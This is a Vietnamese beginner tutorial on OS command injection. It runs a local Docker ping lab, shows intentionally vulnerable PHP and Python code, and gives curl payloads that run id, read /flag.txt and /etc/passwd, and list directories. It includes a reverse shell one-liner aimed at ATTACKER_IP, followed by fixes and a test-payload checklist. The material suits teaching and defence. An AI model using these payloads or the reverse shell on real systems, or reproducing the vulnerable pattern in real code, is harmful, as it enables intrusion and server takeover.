# Command Injection

> **Độ khó:** Easy — **Trình độ:** beginner

## Giới thiệu

App đôi khi phải **gọi lệnh hệ điều hành** (ping, tìm file, chuyển ảnh...). Command Injection xảy ra khi input của user bị **trộn vào câu lệnh shell** mà không qua kiểm tra. Attacker có thể chèn lệnh riêng bằng các ký tự đặc biệt như `;`, `&&`, `|`, `` ` ``, `$()`. Hậu quả rất nghiêm trọng — attacker chạy lệnh **với quyền của server**. Thuộc nhóm **A03 Injection**.

---

## Phần A — Hiểu (Understand)

### Cách shell phân tách lệnh

Shell nhận một chuỗi và phân tích nó. Nếu chuỗi có ký tự đặc biệt, shell sẽ tách ra thành nhiều lệnh:

| Ký tự | Nghĩa | Ví dụ |
|-------|-------|-------|
| `;` | Chạy lệnh kế tiếp bất kể trước đó đúng/sai | `whoami; id` |
| `&&` | Chạy lệnh sau **chỉ khi** lệnh trước thành công | `ls && whoami` |
| `\|` | Pipe: đưa output lệnh trước vào lệnh sau | `cat x \| grep secret` |
| `` ` `` | Command substitution (thay bằng output) | `` echo `id` `` |
| `$()` | Command substitution (hiện đại) | `echo $(id)` |
| `\n` | Dòng mới = lệnh mới | `whoami\ncat /flag` |

> **Dễ hiểu:** App làm: `ping 8.8.8.8`. Bạn nhập IP là `8.8.8.8; cat /etc/passwd`. Shell thấy `;` → chạy thêm `cat /etc/passwd`. Cứ như vậy bạn "chèn lệnh" vào giữa câu lệnh đang chạy.

### Cách app dính lỗ hổng

```php
// LỖI CỐ Ý: nối input trực tiếp vào lệnh shell
$ip = $_GET['ip'];
system("ping -c 1 " . $ip);
```

Hoặc Python:

```python
# LỖI CỐ Ý
ip = request.args.get("ip")
os.system(f"ping -c 1 {ip}")
```

Thay vì `os.system`, dùng đúng `subprocess` với **danh sách đối số** (không qua shell) thì an toàn.

---

## Phần B — Khai thác: Lab Command Injection

### Bước 1: Khởi động lab

```bash
cd command-injection/lab
docker compose up -d
# Lab tại: http://localhost:7107
```

Lab là công cụ ping web: nhập địa chỉ IP → server chạy `ping -c 1 <ip>` và hiện kết quả.

<!-- Output already described via CLI commands above -->

### Bước 2: Chạy lệnh bình thường

```bash
$ curl -s "http://localhost:7107/ping?ip=127.0.0.1"
PING 127.0.0.1 (127.0.0.1): 56 data bytes
64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.025 ms
...
```

<!-- Output already described via CLI commands above -->

### Bước 3: Phát hiện lỗ hổng với `;`

```bash
$ curl -s "http://localhost:7107/ping?ip=127.0.0.1;id"
PING 127.0.0.1 (127.0.0.1): 56 data bytes
...
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

<!-- Output already described via CLI commands above -->

> **Giải thích:** Lệnh thực thi trở thành `ping -c 1 127.0.0.1;id`. Sau khi ping xong, shell chạy `id`. Output `uid=33(www-data)` nghĩa là lệnh chạy **dưới quyền web server** — hãy nhớ điều này.

### Bước 4: Đọc file flag

```bash
$ curl -s "http://localhost:7107/ping?ip=127.0.0.1;cat%20/flag.txt"
PING 127.0.0.1 (127.0.0.1): 56 data bytes
...
FLAG{cmd_1nj3ct10n_2026}
```

<!-- Output already described via CLI commands above -->

> **Giải thích:** `/flag.txt` nằm ở root của container. Lệnh `cat /flag.txt` in nội dung flag ra output. `%20` là khoảng trắng URL-encoded.

### Bước 5: Các kỹ thuật thay thế

```bash
# Dùng && (chỉ chạy nếu ping thành công)
$ curl -s "http://localhost:7107/ping?ip=127.0.0.1%26%26%20cat%20/flag.txt"

# Dùng | (pipe) — output không cần đợi ping
$ curl -s "http://localhost:7107/ping?ip=127.0.0.1%7Ccat%20/flag.txt"

# Command substitution — nhét lệnh vào giữa chuỗi
$ curl -s "http://localhost:7107/ping?ip=127.0.0.1;echo%20$(cat%20/flag.txt)"
```

<!-- Output already described via CLI commands above -->

### Bước 6: Dùng curl đọc thêm file nhạy cảm

```bash
# Đọc /etc/passwd
$ curl -s "http://localhost:7107/ping?ip=127.0.0.1;cat%20/etc/passwd"

# Liệt kê thư mục
$ curl -s "http://localhost:7107/ping?ip=127.0.0.1;ls%20-la%20/"

# Lấy reverse shell (nếu có nc): bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'
```

<!-- Output already described via CLI commands above -->

> **Giải thích:** Với command injection bạn có thể đọc mọi file server đọc được, quét mạng nội bộ, hoặc dựng **reverse shell** để điều khiển server. Đây là lý do lỗi này luôn nằm trong danh sách nguy hiểm nhất.

---

## Phần C — Phòng thủ & Checklist (Defend)

### Cách fix

1. **Tránh gọi shell** — dùng API lập trình (ví dụ PHP `gethostbyname`, hay ping qua thư viện):

```php
// KHÔNG dùng system(); dùng hàm chuyên biệt
$result = gethostbyname($ip);
```

2. **Nếu bắt buộc gọi shell, dùng hàm không qua shell** với danh sách đối số (Python):

```python
import subprocess
subprocess.run(["ping", "-c", "1", ip], capture_output=True, text=True)  # an toàn
```

3. **Allowlist/whitelist** input: chỉ cho phép ký tự IP hợp lệ (`0-9 . :`).
4. **Không bao giờ nối trực tiếp input vào chuỗi lệnh.** Chạy với user quyền thấp.

### Checklist test nhanh

```text
[ ] payload: ;id  /  ;whoami  → output lệnh bị in ra?
[ ] payload: &&id  → chạy khi lệnh trước thành công?
[ ] payload: |id  → pipe?
[ ] payload: `id`  hoặc  $(id)  → command substitution?
[ ] payload: \nid  → dòng mới?
[ ] payload: ;sleep 5  → thời gian response chậm (blind)?
[ ] Đọc file: ;cat /etc/passwd
```

---
